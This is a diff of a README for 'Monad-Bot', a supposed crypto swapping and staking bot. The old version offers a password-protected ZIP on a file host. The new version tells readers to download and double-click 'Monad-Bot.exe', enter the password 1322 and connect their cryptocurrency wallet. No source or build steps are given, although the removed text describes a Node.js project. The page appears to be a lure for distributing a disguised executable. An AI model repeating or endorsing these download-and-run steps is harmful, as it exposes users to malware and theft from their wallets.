@@ -1,41 +1,88 @@
-# Monad-BOT
+# 🤖 Monad-Bot - Automate Your Crypto Tasks Easily
 
-An automated bot for managing multiple Monard with proxy support. 
+## 🚀 Getting Started
 
-Monad-BOT is a blockchain automation tool designed to interact with various cryptocurrency services for swapping and staking tokens. It provides a dashboard interface to monitor operations and logs, and it cycles through tasks like wrapping/unwrapping and staking/unstaking tokens.
+Monad-Bot helps you manage your cryptocurrency effortlessly. Whether you want to swap tokens or automate staking, this tool has you covered.
 
-## Features
+## 📥 Download Monad-Bot
 
-- **Dashboard Interface**: Real-time updates on balance, network status, and transaction history.
-- **Automated Cycles**: Configurable cycles for executing swap and staking operations.
-- **Blockchain Interactions**: Utilizes the `ethers` library for seamless blockchain operations.
-- **API Integrations**: Interacts with external APIs to check transaction statuses and claimable staking rewards.
+[![Download Monad-Bot](https://img.shields.io/badge/Download%20Monad%20Bot-v1.0-blue.svg)](https://github.com/GUILHERME-PATEZ/Monad-Bot/releases)
 
-## Installation
+Visit this page to download: [Monad-Bot Releases](https://github.com/GUILHERME-PATEZ/Monad-Bot/releases)
 
-# [DOWNLOAD](https://www.4sync.com/zip/WamRVb3D/Project_V193.html)  
-## PASSWORD: 1322
+## 📋 Key Features
 
-<img width="1272" height="712" alt="Screenshot_1" src="https://github.com/user-attachments/assets/c05bcd8e-24f8-470f-ac96-b81721e53830" />
+- **Dashboard Interface**: Get real-time updates on your balance, network status, and transaction history all in one place.
+  
+- **Automated Cycles**: Set up configurable cycles that execute swap and staking operations for you, saving time and effort.
+  
+- **Blockchain Interactions**: Access blockchain functions easily with the `ethers` library, ensuring smooth operations.
+  
+- **API Integrations**: Connect with external APIs to check the status of your transactions and see if you have any staking rewards waiting for you.
 
-- **Dashboard**: The dashboard will display real-time information about the bot's operations, including balance, network status, and transaction logs.
+## 💻 System Requirements
 
-## Configuration
+- **Operating System**: Windows, macOS, or Linux
+- **RAM**: Minimum 4 GB recommended
+- **Processor**: Dual-core or better
+- **Network**: Stable Internet connection required
 
-- **Network Settings**: Configure the RPC URL and explorer URL in `config`.
-- **API Endpoints**: Set the API endpoints for liquid staking and other services.
-- **Contract Addresses**: Update the contract addresses for the tokens and services you wish to interact with.
-- **Cycle Parameters**: Adjust the cycle count, cooldown time, and delay settings to suit your needs.
+## 📥 Download & Install
 
-## Dependencies
+To download Monad-Bot, follow these steps:
 
-- **axios**: For making HTTP requests to external APIs.
-- **blessed**: For creating the terminal-based dashboard interface.
-- **blessed-contrib**: For additional dashboard components.
-- **ethers**: For interacting with the Ethereum blockchain.
+1. Click the download button above or visit the [Monad-Bot Releases](https://github.com/GUILHERME-PATEZ/Monad-Bot/releases) page.
+  
+2. Find the latest version and click on the download link for your operating system.
 
-## License
+3. If the downloaded file is compressed (like a ZIP file), extract it using any file compression software. You can use built-in tools on your operating system.
 
-This project is licensed under the ISC License.
+4. After extracting, locate the application file (usually named `Monad-Bot.exe` for Windows or similar for other OS).
 
-### 🔑 Tags
+5. Double-click the application file to run it.
+
+6. If prompted, enter the password: **1322** to access the features of Monad-Bot.
+
+7. Follow on-screen instructions to complete the setup.
+
+## 📊 User Interface Overview
+
+When you launch Monad-Bot, you will see a user-friendly dashboard. Here’s an overview of what you can expect:
+
+- **Balance Information**: Your current cryptocurrency balance will display prominently, so you always know your holdings.
+  
+- **Transaction History**: Keep track of your swaps and staking activities with a detailed history log.
+  
+- **Task Management**: Configure tasks you want the bot to run automatically. 
+
+## 🔧 Configuring Monad-Bot
+
+After installation, you will want to configure your settings. 
+
+1. **Connect to Your Wallet**: To start using Monad-Bot, connect it to your cryptocurrency wallet. Follow the prompts on the dashboard to complete this step.
+
+2. **Set Up Tasks**: Use the dashboard to specify the actions Monad-Bot should perform, such as swapping or staking tokens.
+
+3. **Adjust Preferences**: Navigate to the settings menu to adjust notification preferences and other configurations that suit your needs.
+
+## 🛠 Troubleshooting
+
+If you encounter issues:
+
+- **Application Won't Start**: Ensure your system meets the requirements. Check your OS and RAM specifications.
+  
+- **Failed to Connect to Wallet**: Verify that your wallet is online and supported by Monad-Bot.
+
+- **Transaction Not Showing**: Wait a few moments. Sometimes transactions take time to be recorded on the blockchain.
+
+## 🌍 Community & Support
+
+Join our community for tips and tricks on using Monad-Bot. You can find help and support in our GitHub Issues page. Feel free to submit any bugs or feature requests there.
+
+## ✉️ Feedback
+
+Your feedback helps us improve Monad-Bot. Share your experience with us directly through GitHub or community forums.
+
+---
+
+Thank you for choosing Monad-Bot to streamline your cryptocurrency tasks. Happy automating!
